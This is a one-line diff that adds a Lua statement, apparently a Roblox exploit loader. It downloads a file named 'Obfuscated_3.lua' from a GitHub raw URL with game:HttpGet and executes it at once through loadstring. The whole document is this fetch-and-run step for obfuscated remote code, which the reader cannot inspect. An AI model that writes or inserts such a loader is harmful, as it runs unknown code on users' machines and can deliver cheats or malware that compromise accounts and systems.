@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NeverLT11/Katarina/main/Obfuscated_3.lua", true))()
